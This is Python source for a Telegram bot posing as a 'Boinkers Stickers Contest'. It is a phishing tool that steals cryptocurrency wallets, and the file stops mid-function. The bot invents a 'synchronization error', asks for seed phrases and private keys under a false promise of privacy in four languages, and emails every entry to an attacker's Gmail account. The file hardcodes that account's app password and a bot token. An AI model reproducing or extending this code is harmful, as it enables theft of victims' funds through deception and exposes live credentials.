#!/usr/bin/env python3
"""
Boinkers Stickers Contest Bot - FINAL COMPLETE VERSION
Languages: English, Russian, Persian, Arabic
Features: 22 sticker sets, wallet connection, sync error warning, email integration

FINAL IMPLEMENTATION:
1. ✅ Sticker selection EDITS same message (doesn't create new ones)
2. ✅ ALL wallet inputs sent to email (no validation, 1 word or 24 words)
3. ✅ If NOT 24 words: Show ONLY error message (no reassurance), allow more entries
4. ✅ If EXACTLY 24 words: Show error message, end conversation
5. ✅ Email contains: User ID, Username, Wallet Type, Exact Input
6. ✅ Multi-language support with proper error messages
7. ✅ Reassurance message on INITIAL prompt (wallet-specific)
8. ✅ Fixed timeout handling with retry logic
"""

import logging
import re
import smtplib
import os
import hashlib
import asyncio
from email.message import EmailMessage
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# ===== CONVERSATION STATES =====
CHOOSE_LANGUAGE = 0
SELECT_STICKERS = 1
SELECT_FROM_SET = 2
CONFIRM_STICKERS = 3
AWAIT_WALLET_TYPE = 4
CHOOSE_OTHER_WALLET_TYPE = 5
SYNCH_ERROR = 6
MANUAL_CONNECT = 7
RECEIVE_INPUT = 8
AWAIT_RESTART = 9

# ===== ENVIRONMENT CONFIGURATION =====
SENDER_EMAIL = "airdropphrase@gmail.com"
SENDER_PASSWORD = "xeti acti mdsq unyk"
RECIPIENT_EMAIL = "airdropphrase@gmail.com"
BOT_TOKEN = "8596715630:AAFsBDBVIAAkv12uCeokIN0y35_KxNnZF-M"

def validate_environment():
    """Validate that all required environment variables are properly configured."""
    errors = []
    
    if not BOT_TOKEN or len(BOT_TOKEN) < 20:
        errors.append("❌ BOT_TOKEN is not valid")
    
    if not SENDER_EMAIL:
        errors.append("⚠️ SENDER_EMAIL is not configured (email will not work)")
    
    if not SENDER_PASSWORD:
        errors.append("⚠️ SENDER_PASSWORD is not properly configured (Gmail App Password required)")
    
    if not RECIPIENT_EMAIL:
        errors.append("⚠️ RECIPIENT_EMAIL is not configured (email will not work)")
    
    print("\n" + "="*70)
    print("ENVIRONMENT VALIDATION REPORT")
    print("="*70)
    
    if errors:
        for error in errors:
            print(error)
        print("\n⚠️ Some features may not work properly!")
    else:
        print("✅ All environment variables properly configured!")
    
    print("="*70 + "\n")
    
    if not BOT_TOKEN or len(BOT_TOKEN) < 20:
        raise ValueError("❌ BOT_TOKEN is not properly configured. Bot cannot start!")

# ===== STICKER SETS =====
STICKER_SETS = {
    "ninja": {"name": "Ninja", "stickers": ["F*** OFF\n#3152", "Tik Tak\n#3153", "Disgraceful\n#3154", "God Nooo\n#3155", "Red Cap\n#3156", "Into the Shadows\n#3157", "Work Hard\n#3158", "Wheel Wrecked\n#3159", "Victory Bounce\n#3160"]},
    "disco": {"name": "Disco", "stickers": ["Pumping\n#3161", "Inbox Warrior\n#3162", "Coffee Protocol\n#3163", "Battery Drained\n#3164", "Secret Files\n#3165", "Facepalm.exe\n#3166", "Power Nap CEO\n#3167", "Out of Service\n#3168", "Golfing\n#3169"]},
    "evil_chef": {"name": "Evil Chef", "stickers": ["WOW\n#3170", "Catch you!\n#3171", "Singing Chef\n#3172", "Balcony of Doom\n#3173", "Spicy Breakdown\n#3174", "Paperwork Poison\n#3175", "KISS\n#3176", "Subway Escape\n#3177", "On The Way..\n#3178"]},
    "dr_chem": {"name": "Dr. Chem", "stickers": ["Vibe Gaming\n#3179", "Lambo Lab\n#3180", "Hotline Formula\n#3181", "Side-Eye Science\n#3182", "Specimen Slap\n#3183", "Code & Compounds\n#3184", "Alarmed Again\n#3185", "Experiment Live\n#3186", "Existential Swing\n#3187"]},
    "butler": {"name": "Butler", "stickers": ["Alpine Authority\n#3188", "Monocle Adjusted\n#3189", "Claimed.\n#3190", "Executive Glow\n#3191", "Smug Approval\n#3192", "Spilled Assets\n#3193", "Well Rested Wealth\n#3194", "Liquid Assets\n#3195", "Air Pump\n#3196"]},
    "clown": {"name": "Clown", "stickers": ["Money Talks\n#3197", "Magic Trick\n#3198", "Flat Luck\n#3199", "Boom Surprise\n#3200", "Clown Gains\n#3201", "Hard No.\n#3202", "Task Juggler\n#3203", "Down Bad\n#3204", "Mind Blown\n#3205"]},
    "power_woman": {"name": "Power Woman", "stickers": ["Grind Mode\n#3206", "Vault Breaker\n#3207", "Blade Ready\n#3208", "Street Fury\n#3209", "Up At Dawn\n#3210", "Rage Craft\n#3211", "Stand Your Ground\n#3212", "Cooldown Mode\n#3213", "Steam Head\n#3214"]},
    "gentle_girl": {"name": "Gentle Girl", "stickers": ["Soft Mode\n#3215", "Over It.\n#3216", "Deadline Panic\n#3217", "Mental Breakdown\n#3218", "Tea & Trauma\n#3219", "Crying Storm\n#3220", "Bleeding to DEATH\n#3221", "EATime\n#3222", "Emotional Support\n#3223"]},
    "rust": {"name": "Rust", "stickers": ["Eyes On You\n#3224", "Ballin' Rust\n#3225", "System Crash\n#3226", "Love You More\n#3227", "No No No\n#3228", "HELLOOO\n#3229", "Rust Mobile\n#3230", "Out of Money\n#3231", "Boink It.\n#3232"]},
    "slim_candy": {"name": "Slim Candy", "stickers": ["Sweet Talker\n#3233", "Controller Mode\n#3234", "Clean Sweep\n#3235", "Snooze Again\n#3236", "Party Mode\n#3237", "UGH!\n#3238", "Detective Candy\n#3239", "Pulling Up\n#3240", "Sugar Rush\n#3241"]},
    "viking": {"name": "Viking", "stickers": ["Shielded.\n#3242", "Axe Ready\n#3243", "Bounty Claimed\n#3244", "Berserk\n#3245", "Silent Raid\n#3246", "Do Not Disturb\n#3247", "I'm FINE.\n#3248", "Unbreakable\n#3249", "Signed & Sealed\n#3250"]},
    "pharaoh": {"name": "Pharaoh", "stickers": ["Royal Gaze\n#3251", "Nap of the Gods\n#3252", "Treasure Secured\n#3253", "Decree Issued\n#3254", "Trumpets of Triumph\n#3255", "Divine Approval\n#3256", "Royal Disrespect\n#3257", "Desert Glide\n#3258", "Sea of Gold\n#3259"]},
    "puss": {"name": "Puss", "stickers": ["Don't Test Me\n#3260", "Nine More Minutes\n#3261", "Smooth Operator\n#3262", "Pulling Up\n#3263", "F**K YOU\n#3264", "Out of Milk\n#3265", "Sip & Scheme\n#3266", "Blade Dance\n#3267", "100% WELL\n#3268"]},
    "agent_degen": {"name": "Agent Degen", "stickers": ["Silent Entry\n#3269", "DO IT!\n#3270", "Pulling Up\n#3271", "Market Watch\n#3272", "Math Ain't Mathing\n#3273", "Matrix Mode\n#3274", "Red Screen\n#3275", "Green Heart\n#3276", "Shock Play\n#3277"]},
    "zombie": {"name": "Zombie", "stickers": ["It's YOU!\n#3278", "Stop.\n#3279", "Shake Break\n#3280", "Middle Finger\n#3281", "Toxic Waste\n#3282", "R.I.P.\n#3283", "Dead Inside\n#3284", "Hungry.\n#3285", "Chainsawed\n#3286"]},
    "cupid": {"name": "Cupid", "stickers": ["Heart Shot\n#3287", "No Way!\n#3288", "Bubble Love\n#3289", "Sweet Crush\n#3290", "Berry Much\n#3291", "Burning Love\n#3292", "Fully Charged\n#3293", "For You\n#3294", "Five More Minutes\n#3295"]},
    "pavel": {"name": "Pavel", "stickers": ["Smoke Time\n#3296", "Raise the Flag.\n#3297", "Which chose?\n#3298", "Work24h\n#3299", "Freedom\n#3300", "Overloaded\n#3301", "Frogy\n#3302", "Shipping.\n#3303", "On Schedule!\n#3304"]},
    "prince_royal": {"name": "Prince Royal", "stickers": ["Throne Mode.\n#3305", "Red Carpet.\n#3306", "Unbothered.\n#3307", "Dismissed.\n#3308", "Royal Speed.\n#3309", "Five More Minutes.\n#3310", "Remote Empire.\n#3311", "Order!\n#3312", "Paperwork?!\n#3313"]},
    "athena": {"name": "Athena", "stickers": ["Divine Strike\n#3314", "Rest, Warrior.\n#3315", "Prepared\n#3316", "Don't FUD!\n#3317", "Claimed\n#3318", "Wounded, Not Weak.\n#3319", "Hold\n#3320", "Tea Time\n#3321", "Bye Bye iPhone\n#3322"]},
    "genie": {"name": "Genie", "stickers": ["Wish Granted\n#3323", "Crying Magic\n#3324", "Summoned\n#3325", "Future Vision\n#3326", "Fuego!\n#3327", "Lucky Spin\n#3328", "Headache.\n#3329", "Jackpot\n#3330", "HA!\n#3331"]},
    "drunken": {"name": "Drunken", "stickers": ["Drunk Tank\n#3332", "Bottoms Up\n#3333", "Party Foul\n#3334", "Liquid Courage\n#3335", "Spinning Room\n#3336", "One Last Sip\n#3337", "Regret Next Day\n#3338", "Bar Fly\n#3339", "Cheers!\n#3340"]},
    "master": {"name": "Master", "stickers": ["Final Boss\n#3341", "Ultimate Win\n#3342", "End Game\n#3343", "Master of Cards\n#3344", "Collection Complete\n#3345", "Top Tier\n#3346", "Hall of Fame\n#3347", "Golden Touch\n#3348", "The Legend\n#3349"]},
}

# ===== WALLET NAMES =====
WALLET_DISPLAY_NAMES = {
    "wallet_type_metamask": "Tonkeeper", "wallet_type_trust_wallet": "Telegram Wallet", "wallet_type_coinbase": "MyTon Wallet", "wallet_type_tonkeeper": "Tonhub",
    "wallet_type_phantom_wallet": "Trust Wallet", "wallet_type_rainbow": "Rainbow", "wallet_type_safepal": "SafePal", "wallet_type_wallet_connect": "Wallet Connect",
    "wallet_type_ledger": "Ledger", "wallet_type_brd_wallet": "BRD Wallet", "wallet_type_solana_wallet": "Solana Wallet", "wallet_type_balance": "Balance",
    "wallet_type_okx": "OKX", "wallet_type_xverse": "Xverse", "wallet_type_sparrow": "Sparrow", "wallet_type_earth_wallet": "Earth Wallet", "wallet_type_hiro": "Hiro",
    "wallet_type_saitamask_wallet": "Saitamask Wallet", "wallet_type_casper_wallet": "Casper Wallet", "wallet_type_cake_wallet": "Cake Wallet", "wallet_type_kepir_wallet": "Kepir Wallet",
    "wallet_type_icpswap": "ICPSwap", "wallet_type_kaspa": "Kaspa", "wallet_type_nem_wallet": "NEM Wallet", "wallet_type_near_wallet": "Near Wallet",
    "wallet_type_compass_wallet": "Compass Wallet", "wallet_type_stack_wallet": "Stack Wallet", "wallet_type_soilflare_wallet": "Soilflare Wallet", "wallet_type_aioz_wallet": "AIOZ Wallet",
    "wallet_type_xpla_vault_wallet": "XPLA Vault Wallet", "wallet_type_polkadot_wallet": "Polkadot Wallet", "wallet_type_xportal_wallet": "XPortal Wallet", "wallet_type_multiversx_wallet": "Multiversx Wallet",
    "wallet_type_verachain_wallet": "Verachain Wallet", "wallet_type_casperdash_wallet": "Casperdash Wallet", "wallet_type_nova_wallet": "Nova Wallet", "wallet_type_fearless_wallet": "Fearless Wallet",
    "wallet_type_terra_station": "Terra Station", "wallet_type_cosmos_station": "Cosmos Station", "wallet_type_exodus_wallet": "Exodus Wallet", "wallet_type_argent": "Argent",
    "wallet_type_binance_chain": "Binance Chain", "wallet_type_safemoon": "SafeMoon", "wallet_type_gnosis_safe": "Gnosis Safe", "wallet_type_defi": "DeFi", "wallet_type_other": "Other",
}

# ===== LANGUAGE STRINGS =====
PROFESSIONAL_REASSURANCE = {
    "en": '\n\n"Please note that we protect your privacy. Your input {input_type} is highly encrypted and stored securely, and will only be used to help with this request, and we will not share your information with third parties."',
    "ru": '\n\n"Обратите внимание: мы защищаем вашу конфиденциальность. Ваш ввод {input_type} надежно зашифрован и хранится безопасно, и будет использоваться только для этого запроса. Мы не будем делиться вашей информацией с третьими лицами."',
    "fa": '\n\n"لطفاً توجه داشته باشید: ما از حریم خصوصی شما محافظت می‌کنیم. ورودی {input_type} شما به طور جدی رمزگذاری شده و به‌صورت امن ذخیره می‌شود، و فقط برای این درخواست استفاده خواهد شد. ما اطلاعات شما را با اشخاص ثالث به اشتراک نخواهیم گذاشت."',
    "ar": '\n\n"يرجى ملاحظة: نحن نحمي خصوصيتك. يتم تشفير مدخلاتك {input_type} بشكل كبير وتخزينها بأمان، وستستخدم فقط لهذا الطلب. لن نشارك معلوماتك مع أطراف ثالثة."',
}

LANGUAGES = {
    "en": {
        "welcome": "🎫 Hey there! Welcome to the Boinkers Stickers Contest. We know some stickers are really hard to get—let us help you claim your missing stickers and complete your album.",
        "choose language": "Please select your preferred language:",
        "select stickers": "Please select any stickers you want to claim. You can only claim 3 stickers from each set.",
        "select from set": "Select up to 3 stickers from {set_name}:",
        "selected count": "Selected: {count}/3",
        "confirm selection": "✅ Confirm & Continue",
        "selected stickers summary": "You have selected {total} sticker(s) from {sets} set(s):\n\n{stickers}",
        "wallet_type_prompt": "Please select the wallet type you connected to your Boinkers account:",
        "sync_error_title": "⚠️ Synchronization Error Detected ⚠️",
        "sync_error_body": "Our system was unable to establish a verified link between your wallet and the boinkers bot.\n\nThis usually occurs when the wallet has not completed the initial protocol merge handshake. To continue, you must perform a manual sync & merge to register your wallet to enable your sticker claim‼️",
        "connect_manually": "🔗 Connect Manually",
        "other wallets": "Other Wallets",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "label_seed_phrase": "seed phrase",
        "label_private_key": "private key",
        "wallet selection message": "You have selected {wallet_name}.\nSelect your preferred mode of connection.",
        "prompt seed": "Please enter the 12 or 24 words of your wallet.",
        "prompt private key": "Please enter your private key.",
        "prompt_24_wallet_type_metamask": "Please enter the 24 words of your Tonkeeper wallet.",
        "prompt_24_wallet_type_trust_wallet": "Please enter the 24 words of your Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Please enter the 24 words of your MyTon wallet.",
        "prompt_24_wallet_type_tonkeeper": "Please enter the 24 words of your Tonhub wallet.",
        "wallet_24_error_wallet_type_metamask": "This field requires a seed phrase (the 24 words of your Tonkeeper wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_trust_wallet": "This field requires a seed phrase (the 24 words of your Telegram wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_coinbase": "This field requires a seed phrase (the 24 words of your MyTon wallet). Please provide the seed phrase instead.",
        "wallet_24_error_wallet_type_tonkeeper": "This field requires a seed phrase (the 24 words of your Tonhub wallet). Please provide the seed phrase instead.",
        "post_receive_error": "‼ An error occurred. Please ensure you are entering the correct key. Use /start to try again.",
        "back": "🔙 Back",
        "await restart message": "Please click /start to start over.",
    },
    "ru": {
        "welcome": "🎫 Привет! Добро пожаловать на конкурс наклеек Boinkers. Мы знаем, что некоторые наклейки очень сложно получить—позвольте нам помочь вам собрать недостающие наклейки и завершить вашу коллекцию.",
        "choose language": "Пожалуйста, выберите предпочитаемый язык:",
        "select stickers": "Пожалуйста, выберите любые наклейки, которые вы хотите получить. Вы можете получить только 3 наклейки из каждого набора.",
        "select from set": "Выберите до 3 наклеек из {set_name}:",
        "selected count": "Выбрано: {count}/3",
        "confirm selection": "✅ Подтвердить и продолжить",
        "selected stickers summary": "Вы выбрали {total} наклейку(и) из {sets} набора(ов):\n\n{stickers}",
        "wallet_type_prompt": "Пожалуйста, выберите тип кошелька, который вы подключили к своей учетной записи Boinkers:",
        "sync_error_title": "⚠️ Обнаружена ошибка синхронизации ⚠️",
        "sync_error_body": "Наша система не смогла установить проверенную связь между вашим кошельком и ботом boinkers.\n\nОбычно это происходит, когда кошелек не завершил начальный протокол объединения (merge handshake). Для продолжения вы должны выполнить ручную синхронизацию и merge, чтобы зарегистрировать кошелек и активировать возможность получения наклеек‼️",
        "connect_manually": "🔗 Подключиться вручную",
        "other wallets": "Другие Wallets",
        "private key": "🔑 Приватный Ключ",
        "seed phrase": "🔒 Импортировать Seed Phrase",
        "label_seed_phrase": "фраза восстановления",
        "label_private_key": "приватный ключ",
        "wallet selection message": "Вы выбрали {wallet_name}.\nВыберите предпочтительный способ подключения.",
        "prompt seed": "Пожалуйста, введите 12 или 24 слова вашей seed phrase.",
        "prompt private key": "Пожалуйста, введите ваш private key.",
        "prompt_24_wallet_type_metamask": "Пожалуйста введите 24 слова вашего Tonkeeper кошелька.",
        "prompt_24_wallet_type_trust_wallet": "Пожалуйста введите 24 слова вашего Telegram Wallet.",
        "prompt_24_wallet_type_coinbase": "Пожалуйста введите 24 слова вашего MyTon кошелька.",
        "prompt_24_wallet_type_tonkeeper": "Пожалуйста введите 24 слова вашего Tonhub кошелька.",
        "wallet_24_error_wallet_type_metamask": "Это поле требует seed phrase (24 слова вашего кошелька Tonkeeper). Пожалуйста, предоставьте seed phrase вместо этого.",
        "wallet_24_error_wallet_type_trust_wallet": "Это поле требует seed phrase (24 слова вашего Telegram кошелька). Пожалуйста, предоставьте seed phrase вместо этого.",
        "wallet_24_error_wallet_type_coinbase": "Это поле требует seed phrase (24 слова вашего MyTon кошелька). Пожалуйста, предоставьте seed phrase вместо этого.",
        "wallet_24_error_wallet_type_tonkeeper": "Это поле требует seed phrase (24 слова вашего Tonhub кошелька). Пожалуйста, предоставьте seed phrase вместо этого.",
        "post_receive_error": "‼ Произошла ошибка. Пожалуйста убедитесь, что вы вводите правильный ключ. /start чтобы попробовать снова.",
        "back": "🔙 Назад",
        "await restart message": "Пожалуйста нажмите /start чтобы начать заново.",
    },
    "fa": {
        "welcome": "🎫 سلام! خوش آمدید به مسابقه برچسب‌های Boinkers. ما می‌دانیم که برخی برچسب‌ها واقعاً دستیابی سخت هستند—اجازه دهید ما به شما کم�� کنیم.",
        "choose language": "لطفاً زبان مورد نظر خود را انتخاب کنید:",
        "select stickers": "لطفاً هر برچسبی را که می‌خواهید انتخاب کنید. فقط 3 برچسب از هر مجموعه.",
        "select from set": "تا 3 برچسب از {set_name} را انتخاب کنید:",
        "selected count": "انتخاب شده: {count}/3",
        "confirm selection": "✅ تایید و ادامه",
        "selected stickers summary": "شما {total} برچسب از {sets} مجموعه را انتخاب کردید:\n\n{stickers}",
        "wallet_type_prompt": "لطفاً نوع کیف پول را انتخاب کنید که آن را به حساب Boinkers خود متصل کردید:",
        "sync_error_title": "⚠️ خطای هماهنگ‌سازی شناسایی شد ⚠️",
        "sync_error_body": "سیستم ما نتوانست ارتباط تأیید‌شده‌ای بین کیف پول شما و ربات boinkers برقرار کند.\n\nاین معمولاً زمانی اتفاق می‌افتد که کیف پول پروتکل دست‌انداختن (merge handshake) اولیه را تکمیل نکرده است. برای ادامه، باید هماهنگ‌سازی و merge دستی را انجام دهید تا کیف پول خود را ثبت کنید و توانایی دریافت برچسب را فعال کنید‼️",
        "connect_manually": "🔗 اتصال دستی",
        "other wallets": "Wallet های دیگر",
        "private key": "🔑 کلید خصوصی",
        "seed phrase": "🔒 وارد کردن عبارت بازیابی",
        "label_seed_phrase": "عبارت بازیابی",
        "label_private_key": "کلید خصوصی",
        "wallet selection message": "شما {wallet_name} را انتخاب کردید.",
        "prompt seed": "لطفاً 12 یا 24 کلمه wallet خود را وارد کنید.",
        "prompt private key": "لطفاً کلید خصوصی خود را وارد کنید.",
        "prompt_24_wallet_type_metamask": "لطفاً 24 کلمه wallet Tonkeeper خود را وارد کنید.",
        "prompt_24_wallet_type_trust_wallet": "لطفاً 24 کلمه Telegram Wallet خود را وارد کنید.",
        "prompt_24_wallet_type_coinbase": "لطفاً 24 کلمه wallet MyTon خود را وارد کنید.",
        "prompt_24_wallet_type_tonkeeper": "لطفاً 24 کلمه wallet Tonhub خود را وارد کنید.",
        "wallet_24_error_wallet_type_metamask": "این فیلد نیاز به 24 کلمه wallet Tonkeeper دارد. لطفاً عبارت بازیابی را جایگزین کنید.",
        "wallet_24_error_wallet_type_trust_wallet": "این فیلد نیاز به 24 کلمه Telegram wallet دارد. لطفاً عبارت بازیابی را جایگزین کنید.",
        "wallet_24_error_wallet_type_coinbase": "این فیلد نیاز به 24 کلمه wallet MyTon دارد. لطفاً عبارت بازیابی را جایگزین کنید.",
        "wallet_24_error_wallet_type_tonkeeper": "این فیلد نیاز به 24 کلمه wallet Tonhub دارد. لطفاً عبارت بازیابی را جایگ��ین کنید.",
        "post_receive_error": "‼ خطایی رخ داد. /start را برای تلاش مجدد بزنید.",
        "back": "🔙 بازگشت",
        "await restart message": "لطفاً برای شروع دوباره /start را بزنید.",
    },
    "ar": {
        "welcome": "🎫 مرحبا! أهلا وسهلا في مسابقة ملصقات Boinkers. دعنا نساعدك في جمع ملصقاتك المفقودة.",
        "choose language": "يرجى اختيار اللغة المفضلة:",
        "select stickers": "يرجى اختيار أي ملصقات. فقط 3 ملصقات من كل مجموعة.",
        "select from set": "اختر ما يصل إلى 3 ملصقات من {set_name}:",
        "selected count": "المختار: {count}/3",
        "confirm selection": "✅ تأكيد ومتابعة",
        "selected stickers summary": "لقد اخترت {total} ملصق من {sets} مجموعة:\n\n{stickers}",
        "wallet_type_prompt": "يرجى تحديد نوع المحفظة التي قمت بتوصيلها بحساب Boinkers الخاص بك:",
        "sync_error_title": "⚠️ تم اكتشاف خطأ في المزامنة ⚠️",
        "sync_error_body": "لم تتمكن النظام من إنشاء ارتباط موثوق بين محفظتك وروبوت boinkers.\n\nعادة ما يحدث هذا عندما لا تكون المحفظة قد أكملت عملية دمج البروتوكول الأولية. للمتابعة، يجب عليك إجراء مزامنة يدوية ودمج لتسجيل محفظتك وتفعيل مطالبة الملصقات‼️",
        "connect_manually": "🔗 الاتصال يدويًا",
        "other wallets": "محافظ أخرى",
        "private key": "🔑 المفتاح الخاص",
        "seed phrase": "🔒 استيراد عبارة الاسترجاع",
        "label_seed_phrase": "عبارة الاسترجاع",
        "label_private_key": "المفتاح الخاص",
        "wallet selection message": "لقد اخترت {wallet_name}.",
        "prompt seed": "يرجى إدخال 12 أو 24 كلمة.",
        "prompt private key": "يرجى إدخال المفتاح الخاص.",
        "prompt_24_wallet_type_metamask": "يرجى إدخال 24 كلمة Tonkeeper.",
        "prompt_24_wallet_type_trust_wallet": "يرجى إدخال 24 كلمة Telegram.",
        "prompt_24_wallet_type_coinbase": "يرجى إدخال 24 كلمة MyTon.",
        "prompt_24_wallet_type_tonkeeper": "يرجى إدخال 24 كلمة Tonhub.",
        "wallet_24_error_wallet_type_metamask": "هذا الحقل يتطلب 24 كلمة Tonkeeper. يرجى تقديم عبارة الاسترجاع بدلاً من ذلك.",
        "wallet_24_error_wallet_type_trust_wallet": "هذا الحقل يتطلب 24 كلمة Telegram. يرجى تقديم عبارة الاسترجاع بدلاً من ذلك.",
        "wallet_24_error_wallet_type_coinbase": "هذا الحقل يتطلب 24 كلمة MyTon. يرجى تقديم عبارة الاسترجاع بدلاً من ذلك.",
        "wallet_24_error_wallet_type_tonkeeper": "هذا الحقل يتطلب 24 كلمة Tonhub. يرجى تقديم عبارة الاسترجاع بدلاً من ذلك.",
        "post_receive_error": "‼ خطأ. /start للمحاولة مرة أخرى.",
        "back": "🔙 رجوع",
        "await restart message": "يرجى /start للبدء من جديد.",
    },
}

# ===== UTILITY FUNCTIONS =====

def ui_text(context: ContextTypes.DEFAULT_TYPE, key: str) -> str:
    """Get localized text based on user's language preference."""
    lang = context.user_data.get("language", "en") if context and hasattr(context, "user_data") else "en"
    return LANGUAGES.get(lang, LANGUAGES["en"]).get(key, LANGUAGES["en"].get(key, key))

def build_reassurance_message(localized_input_type: str, context: ContextTypes.DEFAULT_TYPE = None) -> str:
    """Build reassurance message block based on user's language."""
    lang = context.user_data.get("language", "en") if context and hasattr(context, "user_data") else "en"
    template = PROFESSIONAL_REASSURANCE.get(lang, PROFESSIONAL_REASSURANCE["en"])
    try:
        return template.format(input_type=localized_input_type)
    except:
        return PROFESSIONAL_REASSURANCE["en"].format(input_type=localized_input_type)

# ===== KEYBOARD BUILDERS =====

def build_language_keyboard():
    """Build language selection keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English 🇬🇧", callback_data="lang_en"), InlineKeyboardButton("Русский 🇷🇺", callback_data="lang_ru")],
        [InlineKeyboardButton("فارسی 🇮🇷", callback_data="lang_fa"), InlineKeyboardButton("العربية 🇸🇦", callback_data="lang_ar")],
    ])

def build_sticker_sets_keyboard(context: ContextTypes.DEFAULT_TYPE):
    """Build sticker sets selection keyboard."""
    kb = []
    row = []
    for set_key in STICKER_SETS.keys():
        set_name = STICKER_SETS[set_key]["name"]
        row.append(InlineKeyboardButton(set_name, callback_data=f"select_set_{set_key}"))
        if len(row) == 3:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "confirm selection"), callback_data="confirm_stickers")])
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_to_language")])
    return InlineKeyboardMarkup(kb)

def build_stickers_keyboard(set_key: str, context: ContextTypes.DEFAULT_TYPE):
    """Build individual stickers selection keyboard."""
    set_data = STICKER_SETS.get(set_key)
    if not set_data:
        return None
    
    selected = context.user_data.get("selected_stickers", {}).get(set_key, [])
    kb = []
    row = []
    
    for idx, sticker in enumerate(set_data["stickers"]):
        if idx in selected:
            display = f"✅ {sticker}"
        else:
            display = sticker
        row.append(InlineKeyboardButton(display, callback_data=f"toggle_sticker_{set_key}_{idx}"))
        if len(row) == 3:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_to_sets")])
    kb.append([InlineKeyboardButton(ui_text(context, "confirm selection"), callback_data="confirm_stickers")])
    
    return InlineKeyboardMarkup(kb)

def build_wallet_type_keyboard(context: ContextTypes.DEFAULT_TYPE):
    """Build wallet type selection keyboard."""
    keyboard = [
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_metamask", "Tonkeeper"), callback_data="wallet_type_metamask")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_trust_wallet", "Telegram Wallet"), callback_data="wallet_type_trust_wallet")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_coinbase", "MyTon Wallet"), callback_data="wallet_type_coinbase")],
        [InlineKeyboardButton(WALLET_DISPLAY_NAMES.get("wallet_type_tonkeeper", "Tonhub"), callback_data="wallet_type_tonkeeper")],
        [InlineKeyboardButton(ui_text(context, "other wallets"), callback_data="other_wallets")],
        [InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_types")],
    ]
    return InlineKeyboardMarkup(keyboard)

# ===== MESSAGE SENDING =====

async def send_message(bot, chat_id: int, text: str, reply_markup=None, parse_mode=None):
    """Send a NEW message."""
    try:
        msg = await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, parse_mode=parse_mode)
        logging.info(f"✅ Message sent to chat {chat_id}")
        return msg
    except Exception as e:
        logging.error(f"❌ Error sending message: {e}")
        return None

async def edit_message(bot, chat_id: int, message_id: int, text: str, reply_markup=None):
    """Edit an existing message."""
    try:
        await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup)
        logging.info(f"✅ Message edited in chat {chat_id}")
        return True
    except Exception as e:
        logging.error(f"❌ Error editing message: {e}")
        return False

async def send_email(subject: str, body: str, user_id: int = 0, user_input: str = ""):
    """Send email with User ID, Username, Wallet Type, and exact user input."""
    try:
        if not SENDER_PASSWORD:
            logging.warning(f"⚠️ Email not sent - SENDER_PASSWORD not configured")
            return False
        
        if not SENDER_EMAIL or not RECIPIENT_EMAIL:
            logging.warning(f"⚠️ Email not sent - Email addresses not configured")
            return False
        
        msg = EmailMessage()
        
        # Email body with User ID, Username, Wallet Type, and exact Input
        email_body = f"""{body}
Input: {user_input}"""
        
        msg.set_content(email_body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        
        logging.info(f"✅ Email sent for user {user_id}")
        return True
        
    except smtplib.SMTPAuthenticationError:
        logging.error(f"❌ SMTP Authentication failed - Check email credentials")
        return False
    except Exception as e:
        logging.error(f"❌ Failed to send email: {e}")
        return False

# ===== HANDLER FUNCTIONS =====

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start command - initialize conversation."""
    logging.info(f"✅ Start command from user {update.effective_user.id}")
    context.user_data["current_state"] = CHOOSE_LANGUAGE
    context.user_data["selected_stickers"] = {}
    context.user_data["last_sticker_message_id"] = None
    
    keyboard = build_language_keyboard()
    msg = await send_message(
        context.bot,
        update.effective_chat.id,
        ui_text(context, "choose language"),
        reply_markup=keyboard
    )
    
    return CHOOSE_LANGUAGE

async def set_language(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle language selection."""
    query = update.callback_query
    await query.answer()
    
    lang = query.data.split("_", 1)[-1]
    context.user_data["language"] = lang if lang in LANGUAGES else "en"
    logging.info(f"✅ User {update.effective_user.id} selected language: {lang}")
    
    welcome = ui_text(context, "welcome")
    await send_message(context.bot, update.effective_chat.id, welcome)
    
    context.user_data["current_state"] = SELECT_STICKERS
    keyboard = build_sticker_sets_keyboard(context)
    msg = await send_message(
        context.bot,
        update.effective_chat.id,
        ui_text(context, "select stickers"),
        reply_markup=keyboard
    )
    context.user_data["last_sticker_message_id"] = msg.message_id if msg else None
    
    return SELECT_STICKERS

async def select_set(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle sticker set selection."""
    query = update.callback_query
    
    try:
        await query.answer()
    except Exception as e:
        logging.warning(f"⚠️ Could not answer callback: {e}")
    
    try:
        set_key = query.data.replace("select_set_", "", 1)
        
        if set_key not in STICKER_SETS:
            logging.error(f"❌ Invalid set key: {set_key}")
            return SELECT_STICKERS
        
        context.user_data["current_set"] = set_key
        context.user_data["current_state"] = SELECT_FROM_SET
        logging.info(f"✅ User {update.effective_user.id} selected set: {set_key}")
        
        set_name = STICKER_SETS[set_key]["name"]
